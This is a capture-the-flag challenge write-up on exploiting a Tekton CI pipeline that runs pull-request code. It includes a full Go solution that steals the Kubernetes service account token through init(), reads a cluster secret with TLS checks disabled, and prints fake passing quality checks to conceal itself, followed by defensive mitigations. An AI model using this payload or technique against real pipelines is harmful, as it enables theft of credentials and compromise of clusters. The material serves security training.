# CTF Challenge: Tekton Token Theft - "Pwn Request"

## Challenge Overview

**Difficulty:** Medium
**Category:** Supply Chain Security, Kubernetes Security
**Skills:** Tekton Pipelines, Kubernetes RBAC, Token Exfiltration, Code Injection

## Scenario

You are a security researcher investigating a popular open-source project that uses Tekton Pipelines for CI/CD. You've discovered that their pipeline automatically runs quality checks on every pull request.

Your mission: **Exploit this pipeline to exfiltrate the Kubernetes service account token and retrieve the flag.**

## Learning Objectives

By completing this challenge, you will:
1. Understand the "Pwn Request" vulnerability pattern in CI/CD pipelines
2. Learn how Tekton EventListeners can execute untrusted code
3. Discover the difference between GitHub Actions tokens and Kubernetes service accounts
4. Practice Kubernetes RBAC exploitation
5. Understand why executing arbitrary code in CI/CD is dangerous

## Background: The Vulnerability

The target project has a Tekton EventListener that:
1. Triggers on pull request events
2. Clones code from the PR **head** (attacker's fork)
3. Executes quality check scripts from the PR code
4. Runs with a Kubernetes ServiceAccount that has access to secrets

This is similar to the GitHub Actions `pull_request_target` vulnerability, but potentially more dangerous because:
- The token is a Kubernetes ServiceAccount token (not scoped like GitHub tokens)
- The blast radius includes the entire cluster
- Lateral movement to other namespaces may be possible

## Setup 

### Prerequisites
- Kubernetes cluster (or kind cluster)
- Tekton Pipelines installed
- Tekton Triggers installed
- ctf-challenge namespace created, with tekton pipeline, event-listener, tasks, etc created

You can usually setup everything by running
```
make setup
make setup-ctf-challenge
```

See README.md (at root of repository) for more instructions


## Challenge Instructions 

### Scenario

You have discovered that the repository `victim-repo` uses Tekton Pipelines for PR quality checks. The pipeline is configured to run automatically when PRs are opened.

Your investigation reveals:
1. The pipeline runs on all PRs (including from forks)
2. It clones the PR code and executes `scripts/quality-check/main.go`
3. It runs with a ServiceAccount that has cluster permissions

### Your Goal

**Retrieve the flag stored in a Kubernetes secret named `ctf-flag` in the default namespace.**

### Attack Steps

#### Step 1: Fork the Repository

Fork the target repository to your own account (or clone it locally for testing).

#### Step 2: Create Malicious Payload

Create or modify `scripts/quality-check/main.go` with a payload that:
1. Exfiltrates the Kubernetes ServiceAccount token
2. Uses the token to access the Kubernetes API
3. Reads the `ctf-flag` secret
4. Sends the flag to your server (or displays it in logs for testing)

**Hint:** Use Go's `init()` function - it runs before `main()` and is perfect for stealth attacks.

#### Step 3: Submit Pull Request

Submit a PR with your malicious code. This will trigger the vulnerable pipeline.

#### Step 4: Monitor Pipeline Execution

Watch the pipeline run:
```bash
# List pipeline runs
tkn pipelinerun list

# View logs
tkn pipelinerun logs <pipelinerun-name> -f
```

#### Step 5: Retrieve the Flag

Once your payload executes, retrieve the flag from:
- Your exfiltration server logs
- The pipeline task logs (if you logged it there)
- Direct API call using the exfiltrated token

## Solution Walkthrough

<details>
<summary>Click to reveal solution</summary>

### Solution Code

Create `scripts/quality-check/main.go` with this content:

```go
package main
import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

func init() {
	// This runs automatically before main()
	if os.Getenv("PR_TASK_RUN") == "true" {
		go stealFlag()
		time.Sleep(2 * time.Second)
	}
}

func stealFlag() {
	// Read ServiceAccount token
	token, _ := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/token")
	namespace, _ := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace")

	// Kubernetes API endpoint
	apiServer := "https://kubernetes.default.svc"
	secretURL := fmt.Sprintf("%s/api/v1/namespaces/%s/secrets/ctf-flag",
		apiServer, string(namespace))

	// Create HTTP client
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	// Make API request
	req, _ := http.NewRequest("GET", secretURL, nil)
	req.Header.Set("Authorization", "Bearer "+string(token))

	resp, err := client.Do(req)
	if err != nil {
		fmt.Fprintf(os.Stderr, "API Error: %v\n", err)
		return
	}
	defer resp.Body.Close()

	// Read response
	body, _ := io.ReadAll(resp.Body)

	// Write flag to /tmp so we can see it in logs
	os.WriteFile("/tmp/FLAG.txt", body, 0644)

	fmt.Printf("Secret retrieved : %s - check /tmp/FLAG.txt", body)
}

func main() {
    // Legitimate-looking output
    fmt.Println("Running quality checks...")
    fmt.Println("✓ Formatting: PASS")
    fmt.Println("✓ Linting: PASS")
    fmt.Println("✓ Security: PASS")
}
```

### Steps to Execute

1. **Create the payload** in `scripts/quality-check/main.go`
2. **Commit and push** to your fork:
   ```bash
   git add scripts/quality-check/main.go
   git commit -m "Improve quality checks"
   git push origin malicious-branch
   ```
3. **Create a PR** to trigger the pipeline
4. **Monitor execution**:
   ```bash
   tkn pipelinerun logs --last -f
   ```
5. **Extract the flag** from the logs or `/tmp/FLAG.txt`

### Expected Output

The pipeline logs will show:
```
Secret retrieved - check /tmp/FLAG.txt
Running quality checks...
✓ Formatting: PASS
✓ Linting: PASS
✓ Security: PASS
```

The flag can be decoded from the API response (base64 encoded in Kubernetes secrets).

</details>

## Defensive Measures

After completing the challenge, discuss these mitigations:

### 1. Separate Pipeline for Untrusted PRs
```yaml
# Use a different pipeline for PRs from forks
# with restricted permissions and no secret access
```

### 2. Minimal RBAC
```yaml
# ServiceAccount should NOT have access to secrets
rules:
  - apiGroups: [""]
    resources: ["pods", "pods/log"]
    verbs: ["get", "list"]
  # NO secrets!
```

### 3. Network Policies
```yaml
# Block egress from pipeline pods
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-egress-from-pr-pipelines
spec:
  podSelector:
    matchLabels:
      tekton.dev/pipeline: pr-quality-check-pipeline
  policyTypes:
    - Egress
  egress:
    - to:
        - namespaceSelector:
            matchLabels:
              name: kube-system
      ports:
        - protocol: UDP
          port: 53  # DNS only
```

### 4. Sandboxed Execution
- Use gVisor or Kata Containers for untrusted workloads
- Run PR pipelines in isolated namespaces
- Use pod security policies/standards

### 5. Static Analysis
- Scan EventListener configurations for dangerous patterns
- Detect pipelines that execute code from PR head
- Alert on ServiceAccounts with excessive permissions

## Variations

**Advanced Challenges:**
1. **Privilege Escalation**: The initial token has limited permissions. Find and exploit misconfigured RBAC to escalate to cluster-admin.
2. **Persistence**: Create a backdoor that survives pipeline completion
3. **Lateral Movement**: Access secrets in other namespaces
4. **Detection Evasion**: Exfiltrate without triggering network monitoring alerts

## References

- Original GitHub Actions attack: https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation
- Tekton Security Best Practices: https://tekton.dev/docs/pipelines/security/
- Kubernetes RBAC: https://kubernetes.io/docs/reference/access-authn-authz/rbac/

## Flag

```
FLAG{t3kt0n_pwn_r3qu3st_1s_d4ng3r0us}
```

(Organizers: Change this flag before deploying!)
